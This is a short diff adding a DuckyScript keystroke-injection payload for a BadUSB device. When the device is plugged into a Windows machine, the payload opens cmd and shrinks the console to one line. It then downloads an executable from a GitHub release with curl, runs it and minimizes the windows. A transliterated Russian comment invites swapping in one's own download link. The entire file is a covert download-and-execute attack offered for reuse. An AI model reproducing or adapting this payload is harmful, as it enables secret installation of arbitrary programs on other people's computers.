@@ -1,0 +1,13 @@
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM                                                       VOT TUT GDE SSILKA TI MOZHESH POMENYAT SSILKU NA SVOYU LUCHSHE GITHUB YUZAT KAK YA
+STRING mode con: cols=50 lines=1 && curl -L -o file.exe "https://github.com/Sonys9/M5Tool/releases/download/2.5-fix/M5Tool.exe" && start file.exe && exit
+ENTER
+DELAY 300
+GUI DOWNARROW
+DELAY 800
+GUI DOWNARROW
+ENTER
